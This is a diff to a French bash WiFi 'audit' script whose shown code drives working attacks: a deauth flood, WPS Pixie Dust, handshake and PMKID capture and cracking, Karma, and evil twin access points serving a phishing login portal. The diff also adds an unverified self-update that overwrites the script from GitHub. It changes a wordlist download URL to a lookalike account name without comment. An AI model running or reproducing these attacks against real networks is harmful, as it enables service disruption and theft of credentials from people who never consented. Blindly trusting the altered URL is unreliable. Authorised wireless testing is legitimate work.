@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 #
-# wifi_audit.sh — Script d'audit de sécurité WiFi interactif & automatisé (v2.0)
+# wifi_audit.sh — Script d'audit de sécurité WiFi interactif & automatisé (v2.1)
 #
 # ⚠️ AVERTISSEMENT LÉGAL ⚠️
 # Ce script ne doit être utilisé QUE sur des réseaux WiFi dont vous êtes
@@ -26,10 +26,19 @@ LOGDIR="$HOME/wifi_audit_logs/$(date +%Y%m%d_%H%M%S)"
 mkdir -p "$LOGDIR"
 SESSION_FILE="$HOME/.wifi_audit_session"
 
+# ==============================
+# MISE À JOUR AUTOMATIQUE
+# ==============================
+CURRENT_VERSION="2.1"
+GITHUB_REPO="yomix90/wifi-audit-tool"
+BRANCH="main"
+SCRIPT_NAME="wifi_audit.sh"
+SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_REPO}/${BRANCH}/${SCRIPT_NAME}"
+
 # Variables globales
 IFACE=""
 MONIFACE=""
-SECOND_IFACE=""  # Pour Evil Twin (2 cartes)
+SECOND_IFACE=""
 TARGET_BSSID=""
 TARGET_ESSID=""
 TARGET_CH=""
@@ -69,9 +78,9 @@ draw_header() {
     \ V  V / | |  _| | |    / ___ \ |_| | (_| | | |_ 
      \_/\_/  |_|_|   |_|   /_/   \_\__,_|\__,_|_|\__|
 EOF
-    echo -e "${NC}            ${YELLOW}Audit & Analyse de Sécurité Sans-Fil v2.1${NC}"
+    echo -e "${NC}            ${YELLOW}Audit & Analyse de Sécurité Sans-Fil v${CURRENT_VERSION}${NC}"
     echo -e "${BLUE}========================================================================${NC}"
-    
+
     if [[ -n "$MONIFACE" ]]; then
         local current_ch
         current_ch=$(iw dev "$MONIFACE" info 2>/dev/null | awk '/channel/{print $2}' | head -1)
@@ -93,6 +102,64 @@ EOF
     [[ -n "$SECOND_IFACE" ]] && echo -e "  📶 ${BOLD}2ème Interface (Evil Twin):${NC} ${GREEN}$SECOND_IFACE${NC}"
     echo -e "  📁 ${BOLD}Logs:${NC} $LOGDIR"
     echo -e "${BLUE}========================================================================${NC}"
+}
+
+# ==============================
+# MISE À JOUR DEPUIS GITHUB
+# ==============================
+check_update() {
+    draw_header
+    log "Vérification des mises à jour..."
+    info "Source : $SCRIPT_URL"
+
+    local remote_content
+    remote_content=$(curl -fsSL --connect-timeout 10 "$SCRIPT_URL" 2>&1)
+    local curl_exit=$?
+
+    if [[ $curl_exit -ne 0 ]]; then
+        warn "Échec curl (code $curl_exit). Vérifiez l'URL, la branche et la connexion."
+        info "URL testée : $SCRIPT_URL"
+        pause
+        return 1
+    fi
+
+    local remote_version
+    remote_version=$(echo "$remote_content" | grep -m1 '^CURRENT_VERSION=' | sed 's/CURRENT_VERSION=//;s/"//g;s/'\''//g')
+
+    if [[ -z "$remote_version" ]]; then
+        warn "Variable CURRENT_VERSION introuvable dans le fichier distant."
+        pause
+        return 1
+    fi
+
+    log "Version locale : ${GREEN}${CURRENT_VERSION}${NC} | Distante : ${CYAN}${remote_version}${NC}"
+
+    if [[ "$(printf '%s\n' "$remote_version" "$CURRENT_VERSION" | sort -V | head -n1)" != "$remote_version" ]]; then
+        ok "🆕 Nouvelle version disponible : ${GREEN}${remote_version}${NC}"
+        read -rp "Mettre à jour automatiquement ? (o/n) : " upd_choice
+        if [[ "$upd_choice" =~ ^[oOyY]$ ]]; then
+            local script_path
+            script_path=$(readlink -f "$0")
+            local backup="${script_path}.bak.$(date +%s)"
+
+            log "Sauvegarde : $backup"
+            cp "$script_path" "$backup"
+
+            log "Téléchargement v${remote_version}..."
+            if curl -fsSL --connect-timeout 10 -o "$script_path" "$SCRIPT_URL"; then
+                chmod +x "$script_path"
+                ok "✅ Mise à jour réussie vers v${remote_version} !"
+                info "Relancez le script pour appliquer les changements."
+                exit 0
+            else
+                err "Échec du téléchargement. Restauration..."
+                mv "$backup" "$script_path"
+            fi
+        fi
+    else
+        ok "Dernière version installée (v${CURRENT_VERSION})."
+    fi
+    pause
 }
 
 # ==============================
@@ -119,66 +186,10 @@ check_consent() {
     fi
 }
 
-# ==============================
-# MISE À JOUR AUTOMATIQUE DEPUIS GITHUB
-# ==============================
-CURRENT_VERSION="2.5"
-GITHUB_REPO="yomix90/wifi-audit-tool"
-SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_REPO}/main/wifi_audit.sh"
-
-check_update() {
-    log "Vérification des mises à jour..."
-
-    if ! command -v curl &>/dev/null; then
-        warn "curl n'est pas installé, impossible de vérifier les mises à jour en ligne."
-        return 1
-    fi
-
-    # Récupère la dernière version depuis GitHub avec un timeout
-    local remote_version
-    remote_version=$(curl -fsSL --connect-timeout 5 "$SCRIPT_URL" 2>/dev/null | grep -m1 '^CURRENT_VERSION=' | cut -d'"' -f2)
-
-    if [[ -z "$remote_version" ]]; then
-        warn "Impossible de vérifier les mises à jour (pas de connexion ou dépôt inaccessible)."
-        return 1
-    fi
-
-    log "Version locale : ${GREEN}${CURRENT_VERSION}${NC} | Version distante : ${CYAN}${remote_version}${NC}"
-
-    # Comparaison sémantique simple
-    if [[ "$(printf '%s\n' "$remote_version" "$CURRENT_VERSION" | sort -V | head -n1)" != "$remote_version" ]]; then
-        ok "🆕 Nouvelle version disponible : ${GREEN}${remote_version}${NC}"
-        read -rp "Mettre à jour automatiquement ? (o/n) : " upd_choice
-        if [[ "$upd_choice" =~ ^[oOyY]$ ]]; then
-            local script_path
-            script_path=$(readlink -f "$0")
-            local backup="${script_path}.bak.$(date +%s)"
-
-            log "Sauvegarde de l'ancienne version : $backup"
-            cp "$script_path" "$backup"
-
-            log "Téléchargement de la nouvelle version..."
-            if curl -fsSL -o "$script_path" "$SCRIPT_URL"; then
-                chmod +x "$script_path"
-                ok "✅ Mise à jour réussie vers v${remote_version} !"
-                info "L'ancienne version est sauvegardée dans : $backup"
-                info "Relancez le script pour appliquer la mise à jour."
-                exit 0
-            else
-                err "Échec du téléchargement. Restauration de la sauvegarde..."
-                mv "$backup" "$script_path"
-            fi
-        fi
-    else
-        ok "Vous avez la dernière version (v${})."
-    fi
-    return 0
-}
-
 check_deps() {
     draw_header
     echo -e "${BOLD}--- VÉRIFICATION DES OUTILS ---${NC}\n"
-    
+
     local missing_req=()
     local missing_opt=()
 
@@ -212,7 +223,6 @@ check_deps() {
             apt install -y aircrack-ng wifite reaver pixiewps hcxdumptool hcxtools \
                 macchanger xterm hashcat hostapd dnsmasq wireless-tools iw \
                 iptables python3 python3-pip tshark kismet 2>/dev/null || true
-            # wifiphisher via pip
             pip3 install wifiphisher 2>/dev/null || true
             ok "Installation terminée."
         fi
@@ -259,7 +269,7 @@ get_wireless_interfaces() {
 select_interface() {
     draw_header
     echo -e "${BOLD}--- SÉLECTION DE L'INTERFACE ---${NC}\n"
-    
+
     local ifaces=()
     while IFS= read -r iface_name; do
         [[ -n "$iface_name" ]] && ifaces+=("$iface_name")
@@ -301,7 +311,7 @@ select_interface() {
 select_second_interface() {
     draw_header
     echo -e "${BOLD}--- SÉLECTION 2ÈME INTERFACE (pour Evil Twin) ---${NC}\n"
-    
+
     local ifaces=()
     while IFS= read -r iface_name; do
         [[ "$iface_name" != "$IFACE" && -n "$iface_name" ]] && ifaces+=("$iface_name")
@@ -318,7 +328,7 @@ select_second_interface() {
         echo -e "  [${GREEN}$((i + 1))${NC}] ${BOLD}${ifaces[$i]}${NC}"
     done
     echo -e "  [${YELLOW}0${NC}] Retour"
-    
+
     read -rp "Choix : " c
     if [[ "$c" =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#ifaces[@]} )); then
         SECOND_IFACE="${ifaces[$((c - 1))]}"
@@ -410,7 +420,7 @@ test_injection() {
     draw_header
     log "Test d'injection sur $MONIFACE (~10s)..."
     info "Vérification compatibilité carte/driver..."
-    
+
     local result
     if result=$(aireplay-ng --test "$MONIFACE" 2>&1); then
         echo "$result" | tee "$LOGDIR/injection_test.log"
@@ -478,10 +488,9 @@ scan_and_select_target() {
         err "Aucun résultat."; pause; return
     fi
 
-    # Parsing robuste avec awk
     local bssids=() channels=() privacies=() powers=() essids=()
     local in_ap=true
-    
+
     while IFS= read -r line; do
         [[ -z "$line" || "$line" == "BSSID"* ]] && continue
         if [[ "$line" == "Station MAC"* ]]; then
@@ -494,7 +503,7 @@ scan_and_select_target() {
             priv=$(echo "$line" | awk -F', ' '{print $6}' | tr -d ' ')
             pwr=$(echo "$line" | awk -F', ' '{print $9}' | tr -d ' ')
             essid=$(echo "$line" | cut -d',' -f14- | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/"//g')
-            
+
             if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                 bssids+=("$bssid")
                 channels+=("$ch")
@@ -524,7 +533,7 @@ scan_and_select_target() {
     done
     echo "-----------------------------------------------------------------------"
     read -rp "Sélection [1-$total] : " ap_choice
-    
+
     if [[ "$ap_choice" =~ ^[0-9]+$ ]] && (( ap_choice >= 1 && ap_choice <= total )); then
         local idx=$((ap_choice - 1))
         TARGET_BSSID="${bssids[$idx]}"
@@ -572,7 +581,7 @@ capture_handshake() {
     draw_header
     echo -e "${BOLD}--- CAPTURE HANDSHAKE WPA/WPA2 ---${NC}\n"
     echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) CH: ${YELLOW}$TARGET_CH${NC}"
-    
+
     local client_list=()
     while IFS= read -r line; do
         [[ -n "$line" ]] && client_list+=("$line")
@@ -639,7 +648,7 @@ capture_pmkid() {
     ensure_monitor_active || return
     draw_header
     echo -e "${BOLD}--- CAPTURE PMKID ---${NC}\n"
-    
+
     if ! command -v hcxdumptool &>/dev/null; then
         err "hcxdumptool non installé."; pause; return
     fi
@@ -672,7 +681,7 @@ wps_attack() {
     ensure_target_selected || return
     draw_header
     echo -e "${BOLD}--- WPS PIXIE DUST ---${NC}\n"
-    
+
     if ! command -v reaver &>/dev/null; then
         err "reaver non installé."; pause; return
     fi
@@ -719,25 +728,21 @@ evil_twin_classic() {
 
     local fake_ssid="${TARGET_ESSID:-EvilTwin}"
     [[ "$fake_ssid" == "<Masqué>" ]] && read -rp "ESSID à cloner : " fake_ssid
-    
+
     local channel_evil=1
     [[ "$TARGET_CH" -lt 6 ]] && channel_evil=11 || channel_evil=1
 
     log "Création faux AP : $fake_ssid sur canal $channel_evil..."
-    
-    # Arrêt des services conflitants
+
     systemctl stop NetworkManager 2>/dev/null || true
 
-    # Démarrage airbase-ng
     airbase-ng -c "$channel_evil" -e "$fake_ssid" -P -C 20 "$SECOND_IFACE" > "$LOGDIR/airbase.log" 2>&1 &
     EVIL_TWIN_PID=$!
     sleep 3
 
-    # Configuration bridge at0
     ip addr add 192.168.2.1/24 dev at0 2>/dev/null || true
     ip link set at0 up 2>/dev/null || true
 
-    # DHCP server
     cat > /tmp/evil_dnsmasq.conf << EOF
 interface=at0
 dhcp-range=192.168.2.10,192.168.2.100,255.255.255.0,12h
@@ -751,7 +756,6 @@ EOF
     dnsmasq -C /tmp/evil_dnsmasq.conf -p0 > /dev/null 2>&1 &
     local dhcp_pid=$!
 
-    # Serveur web phishing simple
     mkdir -p /tmp/evil_portal
     cat > /tmp/evil_portal/index.html << 'EOF'
 <!DOCTYPE html><html><head><title>Portail WiFi</title></head>
@@ -769,7 +773,6 @@ EOF
     local http_pid=$!
     cd - > /dev/null
 
-    # NAT
     echo 1 > /proc/sys/net/ipv4/ip_forward
     iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
 
@@ -779,7 +782,6 @@ EOF
     info "Appuyez sur [Entrée] pour arrêter l'Evil Twin..."
     read -r
 
-    # Cleanup
     kill "$EVIL_TWIN_PID" "$dhcp_pid" "$http_pid" 2>/dev/null || true
     wait "$EVIL_TWIN_PID" 2>/dev/null || true
     rm -f /tmp/evil_dnsmasq.conf
@@ -797,7 +799,7 @@ evil_twin_wifiphisher() {
     draw_header
     echo -e "${BOLD}--- EVIL TWIN WIFIPISHER ---${NC}\n"
     warn "⚠️ Phishing automatisé avancé - Autorisation requise ⚠️"
-    
+
     if ! command -v wifiphisher &>/dev/null; then
         err "wifiphisher non installé."
         read -rp "Installer via pip ? (o/n) : " i
@@ -833,7 +835,7 @@ karma_attack() {
     echo -e "${BOLD}--- KARMA ATTACK (MANA / Probe Responses) ---${NC}\n"
     warn "⚠️ Cette attaque répond aux Probe Requests des clients"
     warn "pour se faire passer pour tous les réseaux connus."
-    
+
     if ! command -v hostapd &>/dev/null; then
         err "hostapd non installé."; pause; return
     fi
@@ -877,17 +879,15 @@ detect_rogue_ap() {
 
     echo ""
     echo "🔍 Analyse des anomalies :"
-    
-    # Détection : même SSID mais BSSID différent
+
     local ssids
     ssids=$(awk -F', ' '$6 !~ /OPN/ && $14 != "" {print $14}' "$file" | sort | uniq -c | awk '$1 > 1 {print $2}')
-    
+
     if [[ -n "$ssids" ]]; then
         warn "⚠️ SSID dupliqués détectés (potentiels clones) :"
         echo "$ssids"
     fi
 
-    # Recherche d'AP ouverts
     local open_aps
     open_aps=$(awk -F', ' '$6 == "OPN" && $14 != "" {print $1 " -> " $14}' "$file")
     if [[ -n "$open_aps" ]]; then
@@ -895,7 +895,6 @@ detect_rogue_ap() {
         echo "$open_aps"
     fi
 
-    # Signal très fort (AP proche)
     local strong
     strong=$(awk -F', ' '$9 < -30 && $14 != "" {print $1 " ["$14"] Pwr:"$9"dB"}' "$file")
     if [[ -n "$strong" ]]; then
@@ -914,15 +913,15 @@ stress_test_deauth() {
     draw_header
     echo -e "${BOLD}--- STRESS TEST (DEAUTH FLOOD) ---${NC}\n"
     warn "⚠️ Test de résistance aux attaques de déauthentification"
-    
+
     read -rp "Durée (s) [défaut: 30] : " dur
     dur="${dur:-30}"
 
     log "Flood de déauth sur $TARGET_BSSID pendant ${dur}s..."
     info "Testez si le réseau résiste (ex: 802.11w PMF activé)."
-    
+
     timeout "$dur" aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONIFACE" 2>&1 | tee "$LOGDIR/stress.log"
-    
+
     echo ""
     info "Analyse : si les clients ne se déconnectent pas, le PMF (802.11w) est actif."
     pause
@@ -932,7 +931,7 @@ krack_test() {
     draw_header
     echo -e "${BOLD}--- TEST VULNÉRABILITÉ KRACK ---${NC}\n"
     warn "⚠️ Nécessite l'outil KRACK de Vanhoefm"
-    
+
     if ! command -v python3 &>/dev/null; then
         err "Python3 requis."; pause; return
     fi
@@ -964,7 +963,7 @@ krack_test() {
 fragattacks_test() {
     draw_header
     echo -e "${BOLD}--- TEST FRAGATTACKS (802.11 fragmentation) ---${NC}\n"
-    
+
     local tool_dir="/opt/fragattacks"
     if [[ ! -d "$tool_dir" ]]; then
         warn "Outil FragAttacks non trouvé."
@@ -1006,7 +1005,7 @@ select_cap_file() {
     echo "  [m] Entrer manuellement"
     echo "  [0] Annuler"
     read -rp "Choix : " p
-    
+
     if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= ${#caps[@]} )); then
         SELECTED_CAP="${caps[$((p - 1))]}"
     elif [[ "$p" == "m" ]]; then
@@ -1026,7 +1025,6 @@ select_wordlist() {
         "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
     )
 
-    # Recherche dynamique
     while IFS= read -r f; do
         [[ -f "$f" ]] && lists+=("$f")
     done < <(find /usr /opt "$HOME" -name "rockyou*" -o -name "*.lst" -o -name "*password*.txt" 2>/dev/null | head -10)
@@ -1041,7 +1039,7 @@ select_wordlist() {
     done
     echo "  [m] Manuel | [d] Télécharger rockyou.txt | [0] Annuler"
     read -rp "Choix : " p
-    
+
     if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= ${#lists[@]} )); then
         SELECTED_WL="${lists[$((p - 1))]}"
         if [[ "$SELECTED_WL" == *.gz ]]; then
@@ -1058,7 +1056,7 @@ select_wordlist() {
         local target="/usr/share/wordlists/rockyou.txt.gz"
         mkdir -p /usr/share/wordlists
         log "Téléchargement rockyou.txt..."
-        curl -L -o "$target" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null
+        curl -L -o "$target" https://github.com/brannondorffy/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null
         [[ -f "$target" ]] && gunzip -k "$target" 2>/dev/null
         SELECTED_WL="/usr/share/wordlists/rockyou.txt"
     else
@@ -1069,10 +1067,10 @@ select_wordlist() {
 crack_handshake() {
     draw_header
     echo -e "${BOLD}--- CRACKING HANDSHAKE ---${NC}\n"
-    
+
     select_cap_file
     [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]] && { err "Fichier invalide."; pause; return; }
-    
+
     echo ""
     select_wordlist
     [[ -z "$SELECTED_WL" || ! -f "$SELECTED_WL" ]] && { err "Wordlist invalide."; pause; return; }
@@ -1091,7 +1089,7 @@ crack_handshake() {
 crack_pmkid() {
     draw_header
     echo -e "${BOLD}--- CRACKING PMKID (Hashcat/Aircrack) ---${NC}\n"
-    
+
     mapfile -t hashes < <(find "$HOME/wifi_audit_logs" -name "*.22000" 2>/dev/null)
     if [[ ${#hashes[@]} -eq 0 ]]; then
         err "Aucun fichier .22000 trouvé."; pause; return
@@ -1103,7 +1101,7 @@ crack_pmkid() {
     read -rp "Choix : " h
     [[ ! "$h" =~ ^[0-9]+$ ]] && return
     local hf="${hashes[$((h - 1))]}"
-    
+
     select_wordlist
     [[ -z "$SELECTED_WL" ]] && return
 
@@ -1222,7 +1220,7 @@ submenu_cracking() {
 # ==============================
 cleanup_on_exit() {
     echo -e "\n${YELLOW}[*] Nettoyage final...${NC}"
-    
+
     pkill -f "airodump-ng" 2>/dev/null || true
     pkill -f "aireplay-ng" 2>/dev/null || true
     pkill -f "reaver" 2>/dev/null || true
@@ -1243,7 +1241,7 @@ cleanup_on_exit() {
     systemctl restart wpa_supplicant 2>/dev/null || true
     iptables -t nat -F 2>/dev/null || true
     echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
-    
+
     ok "Système restauré. Logs : $LOGDIR"
 }
 
@@ -1256,17 +1254,18 @@ main_menu() {
     while true; do
         draw_header
         echo -e "${BOLD}=== MENU PRINCIPAL ===${NC}\n"
-        echo "  [1] 📡 Gestion Interface & Monitor"
-        echo "  [2] 🔍 Scanner & Sélectionner une Cible"
-        echo "  [3] 🎯 Captures Classiques (Handshake/PMKID/WPS)"
+        echo -e "  [1] 📡 Gestion Interface & Monitor"
+        echo -e "  [2] 🔍 Scanner & Sélectionner une Cible"
+        echo -e "  [3] 🎯 Captures Classiques (Handshake/PMKID/WPS)"
         echo -e "  [4] 👻 ${RED}Attaques Avancées (Evil Twin/Karma)${NC}"
-        echo "  [5] 🔑 Cracking & Analyse"
-        echo "  [6] 🛡️ Tests de Robustesse (KRACK/FragAttacks)"
-        echo "  [7] 📦 Vérifier / Installer dépendances"
-        echo "  [8] 🔄 Restaurer le réseau"
-        echo "  [0] 🚪 Quitter"
+        echo -e "  [5] 🔑 Cracking & Analyse"
+        echo -e "  [6] 🛡️ Tests de Robustesse (KRACK/FragAttacks)"
+        echo -e "  [7] 📦 Vérifier / Installer dépendances"
+        echo -e "  [8] 🔄 Restaurer le réseau"
+        echo -e "  [9] ⬆️  ${GREEN}Mettre à jour le script depuis GitHub${NC}"
+        echo -e "  [0] 🚪 Quitter"
         echo ""
-        read -rp "Sélection [0-8] : " m
+        read -rp "Sélection [0-9] : " m
 
         case "$m" in
             1) submenu_interfaces ;;
@@ -1277,6 +1276,7 @@ main_menu() {
             6) submenu_robustness ;;
             7) check_deps ;;
             8) disable_monitor ;;
+            9) check_update ;;
             0|q|Q)
                 if [[ -n "$MONIFACE" ]]; then
                     read -rp "Désactiver mode monitor avant de quitter ? (o/n) : " s
@@ -1295,6 +1295,5 @@ main_menu() {
 # ==============================
 check_root
 check_consent
-check_update
 load_session
 main_menu
